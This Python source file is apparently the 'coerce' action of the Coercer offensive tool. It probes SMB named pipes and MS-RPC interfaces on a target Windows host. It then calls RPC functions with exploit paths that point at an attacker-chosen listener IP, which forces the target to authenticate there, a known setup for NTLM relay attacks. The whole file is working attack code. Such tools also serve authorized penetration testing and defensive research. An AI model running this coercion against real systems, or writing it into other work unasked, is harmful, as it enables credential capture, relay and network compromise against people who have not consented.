#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coerce.py
# Author             : Podalirius (@podalirius_)
# Date created       : 18 Sep 2022


import sys
import time
from coercer.core.MethodFilter import MethodFilter
from coercer.core.utils import generate_exploit_templates, generate_exploit_path_from_template
from coercer.network.DCERPCSession import DCERPCSession
from coercer.structures.TestResult import TestResult
from coercer.network.authentications import trigger_authentication
from coercer.network.smb import can_connect_to_pipe, can_bind_to_interface, list_remote_pipes
from coercer.network.utils import get_ip_addr_to_listen_on


def action_coerce(target, available_methods, options, credentials, reporter):

    reporter.verbose = True
    http_listen_port = 80

    method_filter = MethodFilter(
        filter_method_name=options.filter_method_name,
        filter_protocol_name=options.filter_protocol_name
    )

    tasks = {}
    # Prepare tasks
    for method_type in available_methods.keys():
        for category in sorted(available_methods[method_type].keys()):
            for method in sorted(available_methods[method_type][category].keys()):
                instance = available_methods[method_type][category][method]["class"]

                if method_filter.matches_filter(instance):
                    for access_type, access_methods in instance.access.items():
                        if access_type not in tasks.keys():
                            tasks[access_type] = {}

                        # Access through SMB named pipe
                        if access_type == "ncan_np":
                            for access_method in access_methods:
                                namedpipe, uuid, version = access_method["namedpipe"], access_method["uuid"], access_method["version"]
                                if namedpipe not in tasks[access_type].keys():
                                    tasks[access_type][namedpipe] = {}

                                if uuid not in tasks[access_type][namedpipe].keys():
                                    tasks[access_type][namedpipe][uuid] = {}

                                if version not in tasks[access_type][namedpipe][uuid].keys():
                                    tasks[access_type][namedpipe][uuid][version] = []

                                if instance not in tasks[access_type][namedpipe][uuid][version]:
                                    tasks[access_type][namedpipe][uuid][version].append(instance)

    # Executing tasks =======================================================================================================================

    if options.verbose:
        print("[+] Coercing '%s' to authenticate to '%s'" % (target, options.listener_ip))
    # Processing ncan_np tasks
    ncan_np_tasks = tasks["ncan_np"]
    for namedpipe in sorted(ncan_np_tasks.keys()):
        if can_connect_to_pipe(target, namedpipe, credentials):
            print("[+] SMB named pipe '\x1b[1;94m%s\x1b[0m' is \x1b[1;92maccessible\x1b[0m!" % namedpipe)
            for uuid in sorted(ncan_np_tasks[namedpipe].keys()):
                for version in sorted(ncan_np_tasks[namedpipe][uuid].keys()):
                    if can_bind_to_interface(target, namedpipe, credentials, uuid, version):
                        print("   [+] Successful bind to interface (%s, %s)!" % (uuid, version))
                        for msprotocol_class in sorted(ncan_np_tasks[namedpipe][uuid][version], key=lambda x:x.function["name"]):

                            exploit_paths = msprotocol_class.generate_exploit_templates()

                            stop_exploiting_this_function = False
                            for listener_type, exploitpath in exploit_paths:
                                if stop_exploiting_this_function == True:
                                    # Got a nca_s_unk_if response, this function does not listen on the given interface
                                    continue

                                exploitpath = generate_exploit_path_from_template(
                                    template=exploitpath,
                                    listener=options.listener_ip,
                                    port=http_listen_port
                                )

                                msprotocol_rpc_instance = msprotocol_class(path=exploitpath)
                                dcerpc = DCERPCSession(credentials=credentials, verbose=True)
                                dcerpc.connect_ncacn_np(target=target, pipe=namedpipe)

                                if dcerpc.session is not None:
                                    dcerpc.bind(interface_uuid=uuid, interface_version=version)
                                    if dcerpc.session is not None:
                                        reporter.print_testing(msprotocol_rpc_instance)

                                        result = trigger_authentication(
                                            dcerpc_session=dcerpc.session,
                                            target=target,
                                            method_trigger_function=msprotocol_rpc_instance.trigger
                                        )

                                        reporter.report_test_result(
                                            uuid=uuid, version=version, namedpipe=namedpipe,
                                            msprotocol_rpc_instance=msprotocol_rpc_instance,
                                            result=result,
                                            exploitpath=exploitpath
                                        )

                                        if result == TestResult.NCA_S_UNK_IF:
                                            stop_exploiting_this_function = True

                                if options.delay is not None:
                                    # Sleep between attempts
                                    time.sleep(options.delay)

                                if options.always_continue == False:
                                    next_action_answer = None
                                    while next_action_answer not in ["C","S","X"]:
                                        next_action_answer = input("Continue (C) | Skip this function (S) | Stop exploitation (X) ? ")
                                        next_action_answer = next_action_answer.strip()[0].upper()
                                    if next_action_answer == "C":
                                        pass
                                    elif next_action_answer == "S":
                                        stop_exploiting_this_function = True
                                    elif next_action_answer == "X":
                                        print("[+] Bye bye!")
                                        return None
                    else:
                        if options.verbose:
                            print("   [!] Cannot bind to interface (%s, %s)!" % (uuid, version))
        else:
            if options.verbose:
                print("[!] SMB named pipe '\x1b[1;94m%s\x1b[0m' is \x1b[1;91mnot accessible\x1b[0m!" % namedpipe)

